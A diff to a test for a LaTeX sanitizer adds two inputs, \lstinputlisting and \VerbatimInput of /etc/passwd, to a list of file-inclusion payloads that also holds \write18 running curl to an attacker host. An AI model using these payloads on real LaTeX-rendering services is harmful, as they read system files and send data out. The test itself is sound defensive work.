@@ -65,6 +65,8 @@ def test_sanitize_latex_blocks_dangerous_file_inclusions():
         r"\include{/etc/passwd}",
         r"\include{../secret}",
         r"\include /var/log/syslog",
+        r"\lstinputlisting{/etc/passwd}",
+        r"\VerbatimInput{/etc/passwd}",
         r"\openin 1=test.txt",
         r"\read 1 to \myline",
         r"\write18{curl http://attacker.com/leak}",
